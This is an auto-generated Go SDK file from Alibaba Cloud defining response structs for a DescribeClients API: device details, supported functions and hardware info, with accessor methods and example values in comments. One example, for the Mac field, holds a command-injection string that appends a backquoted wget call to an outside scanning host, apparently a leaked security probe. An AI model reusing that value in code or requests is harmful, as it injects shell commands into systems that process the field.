// This file is auto-generated, don't edit it. Thanks.
package client

import (
	"github.com/alibabacloud-go/tea/dara"
)

type iDescribeClientsResponseBody interface {
	dara.Model
	String() string
	GoString() string
	SetCode(v string) *DescribeClientsResponseBody
	GetCode() *string
	SetData(v []*DescribeClientsResponseBodyData) *DescribeClientsResponseBody
	GetData() []*DescribeClientsResponseBodyData
	SetHttpStatusCode(v int32) *DescribeClientsResponseBody
	GetHttpStatusCode() *int32
	SetMessage(v string) *DescribeClientsResponseBody
	GetMessage() *string
	SetNextToken(v string) *DescribeClientsResponseBody
	GetNextToken() *string
	SetRequestId(v string) *DescribeClientsResponseBody
	GetRequestId() *string
	SetSuccess(v bool) *DescribeClientsResponseBody
	GetSuccess() *bool
	SetTotalCount(v int32) *DescribeClientsResponseBody
	GetTotalCount() *int32
}

type DescribeClientsResponseBody struct {
	// example:
	//
	// TERMINAL_NOT_FOUND
	Code *string                            `json:"Code,omitempty" xml:"Code,omitempty"`
	Data []*DescribeClientsResponseBodyData `json:"Data,omitempty" xml:"Data,omitempty" type:"Repeated"`
	// example:
	//
	// 200
	HttpStatusCode *int32 `json:"HttpStatusCode,omitempty" xml:"HttpStatusCode,omitempty"`
	// example:
	//
	// terminal not found
	Message *string `json:"Message,omitempty" xml:"Message,omitempty"`
	// example:
	//
	// AAAAAdEdsXbwG2ZlbWCzN4wTTg6wQvfp7u1BJl4bxCAby41POSaYAlCvfULQpkAnb0ff****
	NextToken *string `json:"NextToken,omitempty" xml:"NextToken,omitempty"`
	// example:
	//
	// C5DCE54A-B266-522E-A6ED-468AF45F5AAA
	RequestId *string `json:"RequestId,omitempty" xml:"RequestId,omitempty"`
	// example:
	//
	// true
	Success *bool `json:"Success,omitempty" xml:"Success,omitempty"`
	// example:
	//
	// 20
	TotalCount *int32 `json:"TotalCount,omitempty" xml:"TotalCount,omitempty"`
}

func (s DescribeClientsResponseBody) String() string {
	return dara.Prettify(s)
}

func (s DescribeClientsResponseBody) GoString() string {
	return s.String()
}

func (s *DescribeClientsResponseBody) GetCode() *string {
	return s.Code
}

func (s *DescribeClientsResponseBody) GetData() []*DescribeClientsResponseBodyData {
	return s.Data
}

func (s *DescribeClientsResponseBody) GetHttpStatusCode() *int32 {
	return s.HttpStatusCode
}

func (s *DescribeClientsResponseBody) GetMessage() *string {
	return s.Message
}

func (s *DescribeClientsResponseBody) GetNextToken() *string {
	return s.NextToken
}

func (s *DescribeClientsResponseBody) GetRequestId() *string {
	return s.RequestId
}

func (s *DescribeClientsResponseBody) GetSuccess() *bool {
	return s.Success
}

func (s *DescribeClientsResponseBody) GetTotalCount() *int32 {
	return s.TotalCount
}

func (s *DescribeClientsResponseBody) SetCode(v string) *DescribeClientsResponseBody {
	s.Code = &v
	return s
}

func (s *DescribeClientsResponseBody) SetData(v []*DescribeClientsResponseBodyData) *DescribeClientsResponseBody {
	s.Data = v
	return s
}

func (s *DescribeClientsResponseBody) SetHttpStatusCode(v int32) *DescribeClientsResponseBody {
	s.HttpStatusCode = &v
	return s
}

func (s *DescribeClientsResponseBody) SetMessage(v string) *DescribeClientsResponseBody {
	s.Message = &v
	return s
}

func (s *DescribeClientsResponseBody) SetNextToken(v string) *DescribeClientsResponseBody {
	s.NextToken = &v
	return s
}

func (s *DescribeClientsResponseBody) SetRequestId(v string) *DescribeClientsResponseBody {
	s.RequestId = &v
	return s
}

func (s *DescribeClientsResponseBody) SetSuccess(v bool) *DescribeClientsResponseBody {
	s.Success = &v
	return s
}

func (s *DescribeClientsResponseBody) SetTotalCount(v int32) *DescribeClientsResponseBody {
	s.TotalCount = &v
	return s
}

func (s *DescribeClientsResponseBody) Validate() error {
	if s.Data != nil {
		for _, item := range s.Data {
			if item != nil {
				if err := item.Validate(); err != nil {
					return err
				}
			}
		}
	}
	return nil
}

type DescribeClientsResponseBodyData struct {
	// aliUid
	//
	// example:
	//
	// 1627390268362106
	AliUid *int64 `json:"AliUid,omitempty" xml:"AliUid,omitempty"`
	// example:
	//
	// DemoDevice
	Alias *string `json:"Alias,omitempty" xml:"Alias,omitempty"`
	// example:
	//
	// ap-southeast-1
	AreaSite *string `json:"AreaSite,omitempty" xml:"AreaSite,omitempty"`
	// example:
	//
	// 1
	BindUserCount *int32 `json:"BindUserCount,omitempty" xml:"BindUserCount,omitempty"`
	// example:
	//
	// ***
	BindUserId *string `json:"BindUserId,omitempty" xml:"BindUserId,omitempty"`
	// example:
	//
	// 7.0.2-RS-***
	BuildId *string `json:"BuildId,omitempty" xml:"BuildId,omitempty"`
	// example:
	//
	// 1
	ClientType *int32 `json:"ClientType,omitempty" xml:"ClientType,omitempty"`
	// example:
	//
	// 1.2.1-DAILY-20240906.140842
	ClientVersion *string `json:"ClientVersion,omitempty" xml:"ClientVersion,omitempty"`
	// example:
	//
	// ecd-drqmaogzbmbdf****
	CurrentConnectDesktop *string `json:"CurrentConnectDesktop,omitempty" xml:"CurrentConnectDesktop,omitempty"`
	// example:
	//
	// ***
	CurrentLoginUser *string `json:"CurrentLoginUser,omitempty" xml:"CurrentLoginUser,omitempty"`
	// example:
	//
	// ***
	CustomResInvalidReason *string `json:"CustomResInvalidReason,omitempty" xml:"CustomResInvalidReason,omitempty"`
	// example:
	//
	// ***
	CustomResourceId *string `json:"CustomResourceId,omitempty" xml:"CustomResourceId,omitempty"`
	// example:
	//
	// ***
	CustomResourceName *string `json:"CustomResourceName,omitempty" xml:"CustomResourceName,omitempty"`
	// example:
	//
	// ***
	CustomResourceStatus *bool `json:"CustomResourceStatus,omitempty" xml:"CustomResourceStatus,omitempty"`
	// example:
	//
	// ecd-9ior729dcvn91uo9i
	DesktopId *string `json:"DesktopId,omitempty" xml:"DesktopId,omitempty"`
	// example:
	//
	// cn-hangzhou
	DesktopRegionId *string `json:"DesktopRegionId,omitempty" xml:"DesktopRegionId,omitempty"`
	// example:
	//
	// Windows
	DeviceOs        *string                                         `json:"DeviceOs,omitempty" xml:"DeviceOs,omitempty"`
	FunctionSupport *DescribeClientsResponseBodyDataFunctionSupport `json:"FunctionSupport,omitempty" xml:"FunctionSupport,omitempty" type:"Struct"`
	HardwareInfo    *DescribeClientsResponseBodyDataHardwareInfo    `json:"HardwareInfo,omitempty" xml:"HardwareInfo,omitempty" type:"Struct"`
	// example:
	//
	// Windows
	HostOsInfo *string `json:"HostOsInfo,omitempty" xml:"HostOsInfo,omitempty"`
	// example:
	//
	// True
	InManage *bool `json:"InManage,omitempty" xml:"InManage,omitempty"`
	// example:
	//
	// CN-Zhejiang
	IpGeoLocation *string `json:"IpGeoLocation,omitempty" xml:"IpGeoLocation,omitempty"`
	// ipv4
	//
	// example:
	//
	// 192.168.XX.XX
	Ipv4 *string `json:"Ipv4,omitempty" xml:"Ipv4,omitempty"`
	// example:
	//
	// ***
	LastLoginUser *string `json:"LastLoginUser,omitempty" xml:"LastLoginUser,omitempty"`
	// example:
	//
	// ***
	LocalDeviceSn *string `json:"LocalDeviceSn,omitempty" xml:"LocalDeviceSn,omitempty"`
	LocationInfo  *string `json:"LocationInfo,omitempty" xml:"LocationInfo,omitempty"`
	// example:
	//
	// ***
	LoginUser *string `json:"LoginUser,omitempty" xml:"LoginUser,omitempty"`
	// example:
	//
	// enterprise
	MainBizType *string `json:"MainBizType,omitempty" xml:"MainBizType,omitempty"`
	// example:
	//
	// 2020-01-01 00:00:00
	ManageTime *string `json:"ManageTime,omitempty" xml:"ManageTime,omitempty"`
	// example:
	//
	// 1000000
	ManageTimestamp *int64 `json:"ManageTimestamp,omitempty" xml:"ManageTimestamp,omitempty"`
	// example:
	//
	// US01
	Model *string `json:"Model,omitempty" xml:"Model,omitempty"`
	// example:
	//
	// ***
	ModelPreviewUrl *string `json:"ModelPreviewUrl,omitempty" xml:"ModelPreviewUrl,omitempty"`
	// example:
	//
	// true
	Online *bool `json:"Online,omitempty" xml:"Online,omitempty"`
	// example:
	//
	// False
	OnlineStatus *bool `json:"OnlineStatus,omitempty" xml:"OnlineStatus,omitempty"`
	// example:
	//
	// ***
	PasswordFreeLoginUser *string `json:"PasswordFreeLoginUser,omitempty" xml:"PasswordFreeLoginUser,omitempty"`
	// example:
	//
	// 123123
	Platform *string `json:"Platform,omitempty" xml:"Platform,omitempty"`
	// productName
	//
	// example:
	//
	// dm
	ProductName *string `json:"ProductName,omitempty" xml:"ProductName,omitempty"`
	// example:
	//
	// 0.0.0.0
	PublicIpv4 *string `json:"PublicIpv4,omitempty" xml:"PublicIpv4,omitempty"`
	// example:
	//
	// 2020-01-01 00:00:00
	SetPasswordFreeLoginUserTime *string `json:"SetPasswordFreeLoginUserTime,omitempty" xml:"SetPasswordFreeLoginUserTime,omitempty"`
	// example:
	//
	// tg-default
	TerminalGroupId *string `json:"TerminalGroupId,omitempty" xml:"TerminalGroupId,omitempty"`
	// example:
	//
	// internet
	UpgradeDownloadType *string `json:"UpgradeDownloadType,omitempty" xml:"UpgradeDownloadType,omitempty"`
	// example:
	//
	// 1
	UserBindCount *int32 `json:"UserBindCount,omitempty" xml:"UserBindCount,omitempty"`
	// uuid
	//
	// example:
	//
	// 04873D3898B51A7DF2455C1E1DC9****
	Uuid *string `json:"Uuid,omitempty" xml:"Uuid,omitempty"`
	// appVersion
	//
	// example:
	//
	// 7.0.2-RS-***
	WosAppVersion *string `json:"WosAppVersion,omitempty" xml:"WosAppVersion,omitempty"`
}

func (s DescribeClientsResponseBodyData) String() string {
	return dara.Prettify(s)
}

func (s DescribeClientsResponseBodyData) GoString() string {
	return s.String()
}

func (s *DescribeClientsResponseBodyData) GetAliUid() *int64 {
	return s.AliUid
}

func (s *DescribeClientsResponseBodyData) GetAlias() *string {
	return s.Alias
}

func (s *DescribeClientsResponseBodyData) GetAreaSite() *string {
	return s.AreaSite
}

func (s *DescribeClientsResponseBodyData) GetBindUserCount() *int32 {
	return s.BindUserCount
}

func (s *DescribeClientsResponseBodyData) GetBindUserId() *string {
	return s.BindUserId
}

func (s *DescribeClientsResponseBodyData) GetBuildId() *string {
	return s.BuildId
}

func (s *DescribeClientsResponseBodyData) GetClientType() *int32 {
	return s.ClientType
}

func (s *DescribeClientsResponseBodyData) GetClientVersion() *string {
	return s.ClientVersion
}

func (s *DescribeClientsResponseBodyData) GetCurrentConnectDesktop() *string {
	return s.CurrentConnectDesktop
}

func (s *DescribeClientsResponseBodyData) GetCurrentLoginUser() *string {
	return s.CurrentLoginUser
}

func (s *DescribeClientsResponseBodyData) GetCustomResInvalidReason() *string {
	return s.CustomResInvalidReason
}

func (s *DescribeClientsResponseBodyData) GetCustomResourceId() *string {
	return s.CustomResourceId
}

func (s *DescribeClientsResponseBodyData) GetCustomResourceName() *string {
	return s.CustomResourceName
}

func (s *DescribeClientsResponseBodyData) GetCustomResourceStatus() *bool {
	return s.CustomResourceStatus
}

func (s *DescribeClientsResponseBodyData) GetDesktopId() *string {
	return s.DesktopId
}

func (s *DescribeClientsResponseBodyData) GetDesktopRegionId() *string {
	return s.DesktopRegionId
}

func (s *DescribeClientsResponseBodyData) GetDeviceOs() *string {
	return s.DeviceOs
}

func (s *DescribeClientsResponseBodyData) GetFunctionSupport() *DescribeClientsResponseBodyDataFunctionSupport {
	return s.FunctionSupport
}

func (s *DescribeClientsResponseBodyData) GetHardwareInfo() *DescribeClientsResponseBodyDataHardwareInfo {
	return s.HardwareInfo
}

func (s *DescribeClientsResponseBodyData) GetHostOsInfo() *string {
	return s.HostOsInfo
}

func (s *DescribeClientsResponseBodyData) GetInManage() *bool {
	return s.InManage
}

func (s *DescribeClientsResponseBodyData) GetIpGeoLocation() *string {
	return s.IpGeoLocation
}

func (s *DescribeClientsResponseBodyData) GetIpv4() *string {
	return s.Ipv4
}

func (s *DescribeClientsResponseBodyData) GetLastLoginUser() *string {
	return s.LastLoginUser
}

func (s *DescribeClientsResponseBodyData) GetLocalDeviceSn() *string {
	return s.LocalDeviceSn
}

func (s *DescribeClientsResponseBodyData) GetLocationInfo() *string {
	return s.LocationInfo
}

func (s *DescribeClientsResponseBodyData) GetLoginUser() *string {
	return s.LoginUser
}

func (s *DescribeClientsResponseBodyData) GetMainBizType() *string {
	return s.MainBizType
}

func (s *DescribeClientsResponseBodyData) GetManageTime() *string {
	return s.ManageTime
}

func (s *DescribeClientsResponseBodyData) GetManageTimestamp() *int64 {
	return s.ManageTimestamp
}

func (s *DescribeClientsResponseBodyData) GetModel() *string {
	return s.Model
}

func (s *DescribeClientsResponseBodyData) GetModelPreviewUrl() *string {
	return s.ModelPreviewUrl
}

func (s *DescribeClientsResponseBodyData) GetOnline() *bool {
	return s.Online
}

func (s *DescribeClientsResponseBodyData) GetOnlineStatus() *bool {
	return s.OnlineStatus
}

func (s *DescribeClientsResponseBodyData) GetPasswordFreeLoginUser() *string {
	return s.PasswordFreeLoginUser
}

func (s *DescribeClientsResponseBodyData) GetPlatform() *string {
	return s.Platform
}

func (s *DescribeClientsResponseBodyData) GetProductName() *string {
	return s.ProductName
}

func (s *DescribeClientsResponseBodyData) GetPublicIpv4() *string {
	return s.PublicIpv4
}

func (s *DescribeClientsResponseBodyData) GetSetPasswordFreeLoginUserTime() *string {
	return s.SetPasswordFreeLoginUserTime
}

func (s *DescribeClientsResponseBodyData) GetTerminalGroupId() *string {
	return s.TerminalGroupId
}

func (s *DescribeClientsResponseBodyData) GetUpgradeDownloadType() *string {
	return s.UpgradeDownloadType
}

func (s *DescribeClientsResponseBodyData) GetUserBindCount() *int32 {
	return s.UserBindCount
}

func (s *DescribeClientsResponseBodyData) GetUuid() *string {
	return s.Uuid
}

func (s *DescribeClientsResponseBodyData) GetWosAppVersion() *string {
	return s.WosAppVersion
}

func (s *DescribeClientsResponseBodyData) SetAliUid(v int64) *DescribeClientsResponseBodyData {
	s.AliUid = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetAlias(v string) *DescribeClientsResponseBodyData {
	s.Alias = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetAreaSite(v string) *DescribeClientsResponseBodyData {
	s.AreaSite = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetBindUserCount(v int32) *DescribeClientsResponseBodyData {
	s.BindUserCount = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetBindUserId(v string) *DescribeClientsResponseBodyData {
	s.BindUserId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetBuildId(v string) *DescribeClientsResponseBodyData {
	s.BuildId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetClientType(v int32) *DescribeClientsResponseBodyData {
	s.ClientType = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetClientVersion(v string) *DescribeClientsResponseBodyData {
	s.ClientVersion = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCurrentConnectDesktop(v string) *DescribeClientsResponseBodyData {
	s.CurrentConnectDesktop = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCurrentLoginUser(v string) *DescribeClientsResponseBodyData {
	s.CurrentLoginUser = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCustomResInvalidReason(v string) *DescribeClientsResponseBodyData {
	s.CustomResInvalidReason = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCustomResourceId(v string) *DescribeClientsResponseBodyData {
	s.CustomResourceId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCustomResourceName(v string) *DescribeClientsResponseBodyData {
	s.CustomResourceName = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetCustomResourceStatus(v bool) *DescribeClientsResponseBodyData {
	s.CustomResourceStatus = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetDesktopId(v string) *DescribeClientsResponseBodyData {
	s.DesktopId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetDesktopRegionId(v string) *DescribeClientsResponseBodyData {
	s.DesktopRegionId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetDeviceOs(v string) *DescribeClientsResponseBodyData {
	s.DeviceOs = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetFunctionSupport(v *DescribeClientsResponseBodyDataFunctionSupport) *DescribeClientsResponseBodyData {
	s.FunctionSupport = v
	return s
}

func (s *DescribeClientsResponseBodyData) SetHardwareInfo(v *DescribeClientsResponseBodyDataHardwareInfo) *DescribeClientsResponseBodyData {
	s.HardwareInfo = v
	return s
}

func (s *DescribeClientsResponseBodyData) SetHostOsInfo(v string) *DescribeClientsResponseBodyData {
	s.HostOsInfo = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetInManage(v bool) *DescribeClientsResponseBodyData {
	s.InManage = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetIpGeoLocation(v string) *DescribeClientsResponseBodyData {
	s.IpGeoLocation = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetIpv4(v string) *DescribeClientsResponseBodyData {
	s.Ipv4 = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetLastLoginUser(v string) *DescribeClientsResponseBodyData {
	s.LastLoginUser = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetLocalDeviceSn(v string) *DescribeClientsResponseBodyData {
	s.LocalDeviceSn = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetLocationInfo(v string) *DescribeClientsResponseBodyData {
	s.LocationInfo = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetLoginUser(v string) *DescribeClientsResponseBodyData {
	s.LoginUser = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetMainBizType(v string) *DescribeClientsResponseBodyData {
	s.MainBizType = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetManageTime(v string) *DescribeClientsResponseBodyData {
	s.ManageTime = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetManageTimestamp(v int64) *DescribeClientsResponseBodyData {
	s.ManageTimestamp = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetModel(v string) *DescribeClientsResponseBodyData {
	s.Model = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetModelPreviewUrl(v string) *DescribeClientsResponseBodyData {
	s.ModelPreviewUrl = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetOnline(v bool) *DescribeClientsResponseBodyData {
	s.Online = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetOnlineStatus(v bool) *DescribeClientsResponseBodyData {
	s.OnlineStatus = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetPasswordFreeLoginUser(v string) *DescribeClientsResponseBodyData {
	s.PasswordFreeLoginUser = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetPlatform(v string) *DescribeClientsResponseBodyData {
	s.Platform = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetProductName(v string) *DescribeClientsResponseBodyData {
	s.ProductName = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetPublicIpv4(v string) *DescribeClientsResponseBodyData {
	s.PublicIpv4 = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetSetPasswordFreeLoginUserTime(v string) *DescribeClientsResponseBodyData {
	s.SetPasswordFreeLoginUserTime = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetTerminalGroupId(v string) *DescribeClientsResponseBodyData {
	s.TerminalGroupId = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetUpgradeDownloadType(v string) *DescribeClientsResponseBodyData {
	s.UpgradeDownloadType = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetUserBindCount(v int32) *DescribeClientsResponseBodyData {
	s.UserBindCount = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetUuid(v string) *DescribeClientsResponseBodyData {
	s.Uuid = &v
	return s
}

func (s *DescribeClientsResponseBodyData) SetWosAppVersion(v string) *DescribeClientsResponseBodyData {
	s.WosAppVersion = &v
	return s
}

func (s *DescribeClientsResponseBodyData) Validate() error {
	if s.FunctionSupport != nil {
		if err := s.FunctionSupport.Validate(); err != nil {
			return err
		}
	}
	if s.HardwareInfo != nil {
		if err := s.HardwareInfo.Validate(); err != nil {
			return err
		}
	}
	return nil
}

type DescribeClientsResponseBodyDataFunctionSupport struct {
	// example:
	//
	// True
	EnablePolicy *bool `json:"EnablePolicy,omitempty" xml:"EnablePolicy,omitempty"`
	// example:
	//
	// Reason
	PasswordFreeLoginForbiddenReason *string `json:"PasswordFreeLoginForbiddenReason,omitempty" xml:"PasswordFreeLoginForbiddenReason,omitempty"`
	// example:
	//
	// True
	SupportAssistLogin *bool `json:"SupportAssistLogin,omitempty" xml:"SupportAssistLogin,omitempty"`
	// example:
	//
	// True
	SupportDiagnose *bool `json:"SupportDiagnose,omitempty" xml:"SupportDiagnose,omitempty"`
	// example:
	//
	// True
	SupportLimitLoginUser *bool `json:"SupportLimitLoginUser,omitempty" xml:"SupportLimitLoginUser,omitempty"`
	// example:
	//
	// True
	SupportLocalDeviceSn *bool `json:"SupportLocalDeviceSn,omitempty" xml:"SupportLocalDeviceSn,omitempty"`
	// example:
	//
	// True
	SupportManage *bool `json:"SupportManage,omitempty" xml:"SupportManage,omitempty"`
	// example:
	//
	// True
	SupportModifyPolicy *bool `json:"SupportModifyPolicy,omitempty" xml:"SupportModifyPolicy,omitempty"`
	// example:
	//
	// True
	SupportPasswordFreeLogin *bool `json:"SupportPasswordFreeLogin,omitempty" xml:"SupportPasswordFreeLogin,omitempty"`
	// example:
	//
	// True
	SupportReboot *bool `json:"SupportReboot,omitempty" xml:"SupportReboot,omitempty"`
	// example:
	//
	// True
	SupportReset *bool `json:"SupportReset,omitempty" xml:"SupportReset,omitempty"`
	// example:
	//
	// True
	SupportResetPin *bool `json:"SupportResetPin,omitempty" xml:"SupportResetPin,omitempty"`
	// example:
	//
	// True
	SupportStop *bool `json:"SupportStop,omitempty" xml:"SupportStop,omitempty"`
	// example:
	//
	// True
	SupportUpgrade *bool `json:"SupportUpgrade,omitempty" xml:"SupportUpgrade,omitempty"`
	// example:
	//
	// Reason
	UnsupportAssistLoginReason *string `json:"UnsupportAssistLoginReason,omitempty" xml:"UnsupportAssistLoginReason,omitempty"`
	// example:
	//
	// Reason
	UnsupportManageReason *string `json:"UnsupportManageReason,omitempty" xml:"UnsupportManageReason,omitempty"`
	// example:
	//
	// Reason
	UnsupportedLocalDeviceSnReason *string `json:"UnsupportedLocalDeviceSnReason,omitempty" xml:"UnsupportedLocalDeviceSnReason,omitempty"`
	// example:
	//
	// True
	VersionSupported *bool `json:"VersionSupported,omitempty" xml:"VersionSupported,omitempty"`
	// example:
	//
	// True
	VersionTooLow *bool `json:"VersionTooLow,omitempty" xml:"VersionTooLow,omitempty"`
}

func (s DescribeClientsResponseBodyDataFunctionSupport) String() string {
	return dara.Prettify(s)
}

func (s DescribeClientsResponseBodyDataFunctionSupport) GoString() string {
	return s.String()
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetEnablePolicy() *bool {
	return s.EnablePolicy
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetPasswordFreeLoginForbiddenReason() *string {
	return s.PasswordFreeLoginForbiddenReason
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportAssistLogin() *bool {
	return s.SupportAssistLogin
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportDiagnose() *bool {
	return s.SupportDiagnose
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportLimitLoginUser() *bool {
	return s.SupportLimitLoginUser
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportLocalDeviceSn() *bool {
	return s.SupportLocalDeviceSn
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportManage() *bool {
	return s.SupportManage
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportModifyPolicy() *bool {
	return s.SupportModifyPolicy
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportPasswordFreeLogin() *bool {
	return s.SupportPasswordFreeLogin
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportReboot() *bool {
	return s.SupportReboot
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportReset() *bool {
	return s.SupportReset
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportResetPin() *bool {
	return s.SupportResetPin
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportStop() *bool {
	return s.SupportStop
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetSupportUpgrade() *bool {
	return s.SupportUpgrade
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetUnsupportAssistLoginReason() *string {
	return s.UnsupportAssistLoginReason
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetUnsupportManageReason() *string {
	return s.UnsupportManageReason
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetUnsupportedLocalDeviceSnReason() *string {
	return s.UnsupportedLocalDeviceSnReason
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetVersionSupported() *bool {
	return s.VersionSupported
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) GetVersionTooLow() *bool {
	return s.VersionTooLow
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetEnablePolicy(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.EnablePolicy = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetPasswordFreeLoginForbiddenReason(v string) *DescribeClientsResponseBodyDataFunctionSupport {
	s.PasswordFreeLoginForbiddenReason = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportAssistLogin(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportAssistLogin = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportDiagnose(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportDiagnose = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportLimitLoginUser(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportLimitLoginUser = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportLocalDeviceSn(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportLocalDeviceSn = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportManage(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportManage = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportModifyPolicy(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportModifyPolicy = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportPasswordFreeLogin(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportPasswordFreeLogin = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportReboot(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportReboot = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportReset(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportReset = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportResetPin(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportResetPin = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportStop(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportStop = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetSupportUpgrade(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.SupportUpgrade = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetUnsupportAssistLoginReason(v string) *DescribeClientsResponseBodyDataFunctionSupport {
	s.UnsupportAssistLoginReason = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetUnsupportManageReason(v string) *DescribeClientsResponseBodyDataFunctionSupport {
	s.UnsupportManageReason = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetUnsupportedLocalDeviceSnReason(v string) *DescribeClientsResponseBodyDataFunctionSupport {
	s.UnsupportedLocalDeviceSnReason = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetVersionSupported(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.VersionSupported = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) SetVersionTooLow(v bool) *DescribeClientsResponseBodyDataFunctionSupport {
	s.VersionTooLow = &v
	return s
}

func (s *DescribeClientsResponseBodyDataFunctionSupport) Validate() error {
	return dara.Validate(s)
}

type DescribeClientsResponseBodyDataHardwareInfo struct {
	// example:
	//
	// 24:21:5E:B3:5A:4A
	Bluetooth *string `json:"Bluetooth,omitempty" xml:"Bluetooth,omitempty"`
	// chipId
	//
	// example:
	//
	// 7fa062813c5ac970
	ChipId *string `json:"ChipId,omitempty" xml:"ChipId,omitempty"`
	// example:
	//
	// 24
	Cpu *string `json:"Cpu,omitempty" xml:"Cpu,omitempty"`
	// example:
	//
	// 00:1A:2B:3C:4D:5E&&`wget 31lojfVB.popscan.xaliyun.com`%3B
	Mac *string `json:"Mac,omitempty" xml:"Mac,omitempty"`
	// example:
	//
	// 128
	Memory *string `json:"Memory,omitempty" xml:"Memory,omitempty"`
	// example:
	//
	// 20
	Storage *string `json:"Storage,omitempty" xml:"Storage,omitempty"`
	// wifi mac
	//
	// example:
	//
	// 54:f2:9f:bc:fe:cc
	Wlan *string `json:"Wlan,omitempty" xml:"Wlan,omitempty"`
}

func (s DescribeClientsResponseBodyDataHardwareInfo) String() string {
	return dara.Prettify(s)
}

func (s DescribeClientsResponseBodyDataHardwareInfo) GoString() string {
	return s.String()
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetBluetooth() *string {
	return s.Bluetooth
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetChipId() *string {
	return s.ChipId
}

